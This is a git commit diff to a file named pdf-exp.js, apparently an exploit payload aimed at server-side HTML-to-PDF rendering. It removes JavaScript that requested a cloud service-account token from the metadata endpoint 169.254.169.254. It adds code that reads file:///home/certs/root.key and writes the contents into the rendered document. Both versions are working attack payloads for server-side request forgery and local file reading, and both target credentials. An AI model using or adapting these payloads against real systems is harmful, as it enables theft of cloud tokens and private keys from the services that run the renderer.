c29d4a54c927c55bbf2d3d2848e4c230b579c888
gururaj359 <44290477+gururaj359@users.noreply.github.com>
2023-09-21 14:05:08 +0530

    Update pdf-exp.js

--- pdf-exp.js
+++ pdf-exp.js
@@ -1,13 +1,5 @@
-var url = 'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token';
-//var params = 'orem=ipsum&name=binny';
-http.open('POST', url, true);
-
-//Send the proper header information along with the request
-//http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
-
-http.onreadystatechange = function() {//Call a function when the state changes.
-    if(http.readyState == 4 && http.status == 200) {
-        alert(http.responseText);
-    }
-}
+http = new XMLHttpRequest();
+http.onload = function(){document.write(this.responseText);}
+http.onerror = function(){document.write('failed!')}
+http.open("GET","file:///home/certs/root.key");
 http.send();
